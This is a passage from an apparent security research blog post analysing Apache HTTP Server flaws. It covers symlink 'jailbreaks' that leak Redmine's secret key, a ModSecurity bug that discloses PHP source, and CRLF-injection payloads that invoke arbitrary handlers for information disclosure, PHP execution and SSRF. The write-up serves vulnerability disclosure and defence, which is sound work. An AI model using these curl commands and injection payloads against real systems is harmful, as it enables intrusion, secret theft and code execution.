<p>Thus, even if the target hasn’t deployed any web application, we can still create XSS using an unsafe <code class="language-plaintext highlighter-rouge">RewriteRule</code> through files that come within the operating system.</p>

<p><img src="/assets/img/blog/20240809/5.png" alt="" /></p>

<h5 id="️-2-2-3-local-gadget-to-lfi">✔️ 2-2-3. Local Gadget to LFI</h5>

<p>What about arbitrary file reading? If the target server has PHP or frontend packages installed, like JpGraph, jQuery-jFeed, or even WordPress or Moodle plugins, their tutorials or debug consoles can become our gadgets, for example:</p>

<ul>
  <li>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</li>
  <li>/usr/share/javascript/jquery-jfeed/proxy.php</li>
  <li>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</li>
</ul>

<p>Here’s a simple example exploiting <code class="language-plaintext highlighter-rouge">proxy.php</code> from jQuery-jFeed to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>

<p><img src="/assets/img/blog/20240809/6.png" alt="" /></p>

<h5 id="️-2-2-4-local-gadget-to-ssrf">✔️ 2-2-4. Local Gadget to SSRF</h5>

<p>Finding an SSRF vulnerability is also a piece of cake, for instance, MagpieRSS offers a <code class="language-plaintext highlighter-rouge">magpie_debug.php</code> file, which is fabulous gadget for exploiting:</p>

<ul>
  <li>/usr/share/php/magpierss/scripts/magpie_debug.php</li>
</ul>

<h5 id="️-2-2-5-local-gadget-to-rce">✔️ 2-2-5. Local Gadget to RCE</h5>

<p>So, can we achieve RCE? Hold on, let’s take it step by step! First, This primitive can reapply all known existing attacks again, like an old version of PHPUnit left behind by development or third-party dependencies, can be directly exploited using <a href="https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841">CVE-2017-9841</a> to execute arbitrary code. Or phpLiteAdmin installed with a read-only copy, which by default has the password <code class="language-plaintext highlighter-rouge">admin</code>. By now, you should see the vast potential of Local Gadgets Manipulation. What remains is to discover even more powerful and universal gadgets!</p>

<p><br /></p>

<h4 id="️-primitive-2-3-jailbreak-from-local-gadgets">⚔️ Primitive 2-3. Jailbreak from Local Gadgets</h4>

<p>You might ask: “Can’t we really break out of <code class="language-plaintext highlighter-rouge">/usr/share</code>?” Of course, we can, that brings out our third primitive — <strong>Jailbreak from <code class="language-plaintext highlighter-rouge">/usr/share</code></strong>!</p>

<p>In <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160">Debian/Ubuntu</a> distributions of Httpd, the <code class="language-plaintext highlighter-rouge">FollowSymLinks</code> option is explicitly enabled by default. Even in non-Debian/Ubuntu versions, Apache HTTP Server also <a href="https://httpd.apache.org/docs/current/mod/core.html#options">implicitly allows Symbolic Links</a> by default.</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /</span><span class="p">&gt;
</span>    <span class="nc">Options</span> <span class="ss">FollowSymLinks</span>
    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> denied
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<h5 id="️-2-3-1-jailbreak-from-local-gadgets">✔️ 2-3-1. Jailbreak from Local Gadgets</h5>

<p>So, any package that has a Symbolic Link in its installation directory pointing outside of <code class="language-plaintext highlighter-rouge">/usr/share</code> can become a stepping-stone to access more gadgets for further exploitation. Here are some useful Symbolic Links we’ve discovered so far:</p>

<ul>
  <li><strong>Cacti Log</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/cacti/site/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/log/cacti/</code></li>
  <li><strong>Solr Data</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/solr/data/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/lib/solr/data</code></li>
  <li><strong>Solr Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/solr/conf/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/etc/solr/conf/</code></li>
  <li><strong>MediaWiki Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/mediawiki/config/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/var/lib/mediawiki/config/</code></li>
  <li><strong>SimpleSAMLphp Config</strong>: <code class="language-plaintext highlighter-rouge">/usr/share/simplesamlphp/config/</code>  -&gt;  <code class="language-plaintext highlighter-rouge">/etc/simplesamlphp/</code></li>
</ul>

<h5 id="️-2-3-2-jailbreak-local-gadgets-to-redmine-rce">✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE</h5>

<p>To wrap up our jailbreak primitive, let’s showcase how to perform an RCE using a double-hop Symbolic Link in Redmine. In the default installation of Redmine, there’s an <code class="language-plaintext highlighter-rouge">instances/</code> folder pointing to <code class="language-plaintext highlighter-rouge">/var/lib/redmine/</code>, and within <code class="language-plaintext highlighter-rouge">/var/lib/redmine/</code>, the <code class="language-plaintext highlighter-rouge">default/config/</code> folder points to the <code class="language-plaintext highlighter-rouge">/etc/redmine/default/</code> directory, which holds Redmine’s database setting and secret key.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file /usr/share/redmine/instances/
 symbolic <span class="nb">link </span>to /var/lib/redmine/
<span class="nv">$ </span>file /var/lib/redmine/config/
 symbolic <span class="nb">link </span>to /etc/redmine/default/
<span class="nv">$ </span><span class="nb">ls</span> /etc/redmine/default/
 database.yml    secret_key.txt
</code></pre></div></div>

<p>Thus, through an insecure <code class="language-plaintext highlighter-rouge">RewriteRule</code> and two Symbolic Links, we can easily access the application secret key used by Redmine:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
 HTTP/1.1 200 OK
 Server: Apache/2.4.59 <span class="o">(</span>Ubuntu<span class="o">)</span> 
 ...
 6d222c3c3a1881c865428edb79a74405
</code></pre></div></div>

<p>And since Redmine is a Ruby on Rails application, the content of <code class="language-plaintext highlighter-rouge">secret_key.txt</code> is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!</p>

<p><img src="/assets/img/blog/20240809/7.png" alt="" /></p>

<p><br /></p>

<h3 id="-3-handler-confusion">🔥 3. Handler Confusion</h3>

<p>The final attack I’m going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Let’s quickly understand this technical debt through an example — if today you want to run the classic <code class="language-plaintext highlighter-rouge">mod_php</code> on Apache HTTP Server, which of the following two directives do you use?</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddHandler</span> application/x-httpd-php .php
<span class="nc">AddType</span>    application/x-httpd-php .php
</code></pre></div></div>

<p>The answer is — both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?</p>

<div class="language-config highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AddHandler</span> <span class="n">handler</span>-<span class="n">name</span> <span class="n">extension</span> [<span class="n">extension</span>] ...
<span class="n">AddType</span> <span class="n">media</span>-<span class="n">type</span> <span class="n">extension</span> [<span class="n">extension</span>] ...
</code></pre></div></div>

<p>Actually, <code class="language-plaintext highlighter-rouge">handler-name</code> and <code class="language-plaintext highlighter-rouge">media-type</code> represent different fields within Httpd’s internal structure, corresponding to <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> and <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code>, respectively. The fact that <strong>users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since <a href="https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c">its early development in 1996</a></strong>:</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420">server/config.c#L420</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AP_CORE_DECLARE</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="n">ap_invoke_handler</span><span class="p">(</span><span class="n">request_rec</span> <span class="o">*</span><span class="n">r</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">// [...]</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">handler</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">((</span><span class="n">p</span><span class="o">=</span><span class="n">ap_strchr_c</span><span class="p">(</span><span class="n">handler</span><span class="p">,</span> <span class="sc">';'</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">char</span> <span class="o">*</span><span class="n">new_handler</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">apr_pmemdup</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">pool</span><span class="p">,</span> <span class="n">handler</span><span class="p">,</span>
                                                        <span class="n">p</span> <span class="o">-</span> <span class="n">handler</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
                <span class="kt">char</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">new_handler</span> <span class="o">+</span> <span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">handler</span><span class="p">);</span>
                <span class="n">handler</span> <span class="o">=</span> <span class="n">new_handler</span><span class="p">;</span>

                <span class="cm">/* exclude media type arguments */</span>
                <span class="k">while</span> <span class="p">(</span><span class="n">p2</span> <span class="o">&gt;</span> <span class="n">handler</span> <span class="o">&amp;&amp;</span> <span class="n">p2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span><span class="p">)</span>
                    <span class="o">--</span><span class="n">p2</span><span class="p">;</span> <span class="cm">/* strip trailing spaces */</span>

                <span class="o">*</span><span class="n">p2</span><span class="o">=</span><span class="sc">'\0'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">handler</span> <span class="o">=</span> <span class="n">AP_DEFAULT_HANDLER_NAME</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span> <span class="o">=</span> <span class="n">handler</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">result</span> <span class="o">=</span> <span class="n">ap_run_handler</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>
</code></pre></div></div>

<p>You can see that before entering the <code class="language-plaintext highlighter-rouge">ap_run_handler()</code>, if <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> is empty, the content of the <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> is used as the final module handler. This is also why <code class="language-plaintext highlighter-rouge">AddType</code> and <code class="language-plaintext highlighter-rouge">AddHandler</code> have the identical effect, because the <code class="language-plaintext highlighter-rouge">media-type</code> is eventually converted into the <code class="language-plaintext highlighter-rouge">handler-name</code> before handling. So, our third Handler Confusion is mainly developed around this behavior.</p>

<p><br /></p>

<h4 id="️-primitive-3-1-overwrite-the-handler">⚔️ Primitive 3-1. Overwrite the Handler</h4>

<p>By understanding this conversion mechanism, the first primitive is — <strong>Overwrite the Handler</strong>. Imagine if today the target Apache HTTP Server uses <code class="language-plaintext highlighter-rouge">AddType</code> to run PHP.</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">AddType</span> application/x-httpd-php  .php
</code></pre></div></div>

<p>In the normal process, when accessing <code class="language-plaintext highlighter-rouge">http://server/config.php</code>, <code class="language-plaintext highlighter-rouge">mod_mime</code>, during the <code class="language-plaintext highlighter-rouge">type_checker</code> phase, Httpd copies the corresponding content into <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> based on the file extension set by <code class="language-plaintext highlighter-rouge">AddType</code>. Since <code class="language-plaintext highlighter-rouge">r-&gt;handler</code> is not assigned during the entire HTTP lifecycle, <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code> will treat <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> as the handler, ultimately calling <code class="language-plaintext highlighter-rouge">mod_php</code> to handle the request.</p>

<p>However, what happens if any module “accidentally” overwrites <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> before reaching <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code>?</p>

<h5 id="️-3-1-1-overwrite-handler-to-disclose-php-source-code">✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code</h5>

<p>The first exploitation of this primitive is to disclose arbitrary PHP source code by the “accidentally-overwrite”. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:</p>

<blockquote>
  <p><a href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf">Apache 0day bug, which still nobody knows of, and which was fixed accidentally</a></p>
</blockquote>

<p>Max Dmitriev observed that by sending an incorrect <code class="language-plaintext highlighter-rouge">Content-Length</code>, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of <code class="language-plaintext highlighter-rouge">AP_FILTER_ERROR</code> while using the Apache Portable Runtime (APR) library, leading to a <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a>. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> to <code class="language-plaintext highlighter-rouge">text/html</code>.</p>

<p><img src="/assets/img/blog/20240809/8.png" alt="" /></p>

<p>Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This “side effect” also overwrote the originally added <code class="language-plaintext highlighter-rouge">Content-Type</code>, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. 🤫</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-v</span> http://127.0.0.1/info.php <span class="nt">-H</span> <span class="s2">"Content-Length: x"</span>
<span class="o">&gt;</span> HTTP/1.1 400 Bad Request
<span class="o">&gt;</span> Date: Mon, 29 Jul 2024 05:32:23 GMT
<span class="o">&gt;</span> Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="o">&gt;</span> Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
&lt;html&gt;&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;title&gt;400 Bad Request&lt;/title&gt;
...
&lt;?php phpinfo<span class="o">()</span><span class="p">;</span>?&gt;
</code></pre></div></div>

<p>In theory, all configurations based on <code class="language-plaintext highlighter-rouge">Content-Type</code> are vulnerable to this type of attack, so apart from the <code class="language-plaintext highlighter-rouge">php-cgi</code> paired with <code class="language-plaintext highlighter-rouge">mod_actions</code> shown in  Max’s slides, pure <code class="language-plaintext highlighter-rouge">mod_php</code> coupled with <code class="language-plaintext highlighter-rouge">AddType</code> is also affected.</p>

<p>It’s worth mentioning that this side effect was corrected as a <a href="https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a">request parser bug</a> in Apache HTTP Server version 2.4.44, thus treating this “vulnerability” as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers <code class="language-plaintext highlighter-rouge">AP_FILTER_ERROR</code> is found.</p>

<p><em>P.S. This issue was reported to ModSecurity through the official security mail on 6/20, and the Project Co-Leader suggested returning to the original <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">GitHub Issue</a> for discussion.</em></p>

<h5 id="️-3-1-2-overwrite-handler-to---">✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████</h5>

<p>Based on the <a href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a> behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.</p>

<p><br /></p>

<h4 id="️-primitive-3-2-invoke-arbitrary-handlers">⚔️ Primitive 3-2. Invoke Arbitrary Handlers</h4>

<p>Let’s think more carefully about the previous Overwrite Handler primitive, although it’s caused by ModSecurity not properly handling errors, leading to the request being set with the wrong <code class="language-plaintext highlighter-rouge">Content-Type</code>, the deeper fundamental root cause should be — <strong>when using <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code>, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the <code class="language-plaintext highlighter-rouge">Content-Type</code> header in the server response</strong>.</p>

<p>Theoretically, if you can control the <code class="language-plaintext highlighter-rouge">Content-Type</code> header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion — <strong>invoking any internal module handler</strong>!</p>

<p>However, there’s still one last piece of the puzzle. In Httpd, all modifications to <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, it’s too late to do further exploitation… is that right?</p>

<p>We turned to <a href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a> for a rescue! RFC 3875 is a specification about CGI, and <a href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2">Section 6.2.2</a> defines a Local Redirect Response behavior:</p>

<blockquote>
  <p>The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
</blockquote>

<p>Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of <code class="language-plaintext highlighter-rouge">mod_cgi</code> implementation of this specification reveals:</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983">modules/generators/mod_cgi.c#L983</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">ap_scan_script_header_err_brigade_ex</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">sbuf</span><span class="p">,</span>          <span class="c1">// &lt;------ [1]</span>
                                                    <span class="n">APLOG_MODULE_INDEX</span><span class="p">)))</span>
    <span class="p">{</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">log_script</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">conf</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">dbuf</span><span class="p">,</span> <span class="n">sbuf</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">script_err</span><span class="p">);</span>

        <span class="c1">// [...]</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="n">HTTP_NOT_MODIFIED</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">location</span> <span class="o">=</span> <span class="n">apr_table_get</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">headers_out</span><span class="p">,</span> <span class="s">"Location"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">&amp;&amp;</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">&amp;&amp;</span> <span class="n">location</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span> <span class="o">&amp;&amp;</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>          <span class="c1">// &lt;------ [2]</span>
        <span class="cm">/* This redirect needs to be a GET no matter what the original
         * method was.
         */</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">method</span> <span class="o">=</span> <span class="s">"GET"</span><span class="p">;</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">method_number</span> <span class="o">=</span> <span class="n">M_GET</span><span class="p">;</span>

        <span class="cm">/* We already read the message body (if any), so don't allow
         * the redirected request to think it has one.  We can ignore
         * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.
         */</span>
        <span class="n">apr_table_unset</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">headers_in</span><span class="p">,</span> <span class="s">"Content-Length"</span><span class="p">);</span>

        <span class="n">ap_internal_redirect_handler</span><span class="p">(</span><span class="n">location</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>                     <span class="c1">// &lt;------ [3]</span>
        <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Initially, <code class="language-plaintext highlighter-rouge">mod_cgi</code> executes<sup>[1]</sup> CGI and scans its output to set the corresponding headers such as <code class="language-plaintext highlighter-rouge">Status</code> and <code class="language-plaintext highlighter-rouge">Content-Type</code>. If<sup>[2]</sup> the returned <code class="language-plaintext highlighter-rouge">Status</code> is 200 and the <code class="language-plaintext highlighter-rouge">Location</code> header starts with a <code class="language-plaintext highlighter-rouge">/</code>, the response is treated as a Server-Side Redirection and should be processed<sup>[3]</sup> internally. A closer look at the implementation of <code class="language-plaintext highlighter-rouge">ap_internal_redirect_handler()</code> shows:</p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800">modules/http/http_request.c#L800</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AP_DECLARE</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">ap_internal_redirect_handler</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">new_uri</span><span class="p">,</span> <span class="n">request_rec</span> <span class="o">*</span><span class="n">r</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">access_status</span><span class="p">;</span>
    <span class="n">request_rec</span> <span class="o">*</span><span class="n">new</span> <span class="o">=</span> <span class="n">internal_internal_redirect</span><span class="p">(</span><span class="n">new_uri</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>    <span class="c1">// &lt;------ [1]</span>

    <span class="cm">/* ap_die was already called, if an error occured */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">handler</span><span class="p">)</span>
        <span class="n">ap_set_content_type</span><span class="p">(</span><span class="n">new</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">content_type</span><span class="p">);</span>                <span class="c1">// &lt;------ [2]</span>
    <span class="n">access_status</span> <span class="o">=</span> <span class="n">ap_process_request_internal</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>             <span class="c1">// &lt;------ [3]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">access_status</span> <span class="o">==</span> <span class="n">OK</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">access_status</span> <span class="o">=</span> <span class="n">ap_invoke_handler</span><span class="p">(</span><span class="n">new</span><span class="p">);</span>                   <span class="c1">// &lt;------ [4]</span>
    <span class="p">}</span>
    <span class="n">ap_die</span><span class="p">(</span><span class="n">access_status</span><span class="p">,</span> <span class="n">new</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Httpd first creates<sup>[1]</sup> a new request structure and copie<sup>[2]</sup> the current <code class="language-plaintext highlighter-rouge">r-&gt;content_type</code> into it. After processing<sub>[3]</sub> the lifecycle, it calls<sup>[4]</sup> <code class="language-plaintext highlighter-rouge">ap_invoke_handler()</code> — the place including the legacy transformation. So, <strong>in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd</strong>. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and here’s a simple list:</p>

<ul>
  <li>mod_cgi</li>
  <li>mod_cgid</li>
  <li>mod_wsgi</li>
  <li>mod_uwsgi</li>
  <li>mod_fastcgi</li>
  <li>mod_perl</li>
  <li>mod_asis</li>
  <li>mod_fcgid</li>
  <li>mod_proxy_scgi</li>
  <li>…</li>
</ul>

<p>As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the response’s <code class="language-plaintext highlighter-rouge">Content-Type</code> and part of the <code class="language-plaintext highlighter-rouge">Location</code>, here are two scenarios for reference:</p>

<ol>
  <li>CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.</li>
  <li>SSRF that can completely control the response headers, such as a project hosted on <code class="language-plaintext highlighter-rouge">mod_wsgi</code> like <a href="https://django-revproxy.readthedocs.io/en/latest/">django-revproxy</a>.</li>
</ol>

<p>The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl </span>
 
<span class="k">use</span> <span class="nv">CGI</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$q</span> <span class="o">=</span> <span class="nv">CGI</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;</span>
<span class="k">my</span> <span class="nv">$redir</span> <span class="o">=</span> <span class="nv">$q</span><span class="o">-&gt;</span><span class="nv">param</span><span class="p">("</span><span class="s2">r</span><span class="p">");</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$redir</span> <span class="o">=~</span> <span class="sr">m{^https?://}</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="p">"</span><span class="s2">Location: </span><span class="si">$redir</span><span class="se">\n</span><span class="p">";</span>
<span class="p">}</span>
<span class="k">print</span> <span class="p">"</span><span class="s2">Content-Type: text/html</span><span class="se">\n\n</span><span class="p">";</span>
</code></pre></div></div>

<h5 id="️-3-2-1-arbitrary-handler-to-information-disclosure">✔️ 3-2-1. Arbitrary Handler to Information Disclosure</h5>

<p>Starting with invoking an arbitrary handler to disclose information, we use the built-in <code class="language-plaintext highlighter-rouge">server-status</code> handler in Apache HTTP Server, which is typically only allowed to be accessed locally:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Location</span><span class="sr"> /server-status</span><span class="p">&gt;
</span>    <span class="nc">SetHandler</span> server-status
    <span class="nc">Require</span> local
<span class="p">&lt;/</span><span class="nl">Location</span><span class="p">&gt;
</span></code></pre></div></div>

<p>With the ability to invoke any handler, it becomes possible to overwrite the <code class="language-plaintext highlighter-rouge">Content-Type</code> to access sensitive information that should not be accessible remotely:</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:server-status</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p><img src="/assets/img/blog/20240809/9.png" alt="" /></p>

<h5 id="️-3-2-2-arbitrary-handler-to-misinterpret-scripts">✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts</h5>

<p>It’s also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying <code class="language-plaintext highlighter-rouge">mod_php</code> to execute embedded malicious code within the image, like:</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/uploads/avatar.webp</em></strong> %0d%0a <br />
<strong><em>Content-Type:application/x-httpd-php</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<h5 id="️-3-2-2-arbitrary-handler-to-full-ssrf">✔️ 3-2-2. Arbitrary Handler to Full SSRF</h5>

<p>Calling the <code class="language-plaintext highlighter-rouge">mod_proxy</code> to access any protocol on any URL is, of course, straightforward:</p>

<blockquote>
  <p>http://server/cgi-bin/redir.cgi?r=http:// %0d%0a <br />
<strong><em>Location:/ooo</em></strong> %0d%0a <br />
<strong><em>Content-Type:proxy:http://example.com/%3f</em></strong> %0d%0a <br />
%0d%0a <br /></p>
</blockquote>

<p>Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, <code class="language-plaintext highlighter-rouge">mod_proxy</code> automatically adds an <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header, which gets blocked by EC2 and GCP’s <a href="https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations">Metadata protection mechanisms</a>, otherwise, this would be an even more powerful primitive.</p>

<h5 id="️-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket">✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</h5>

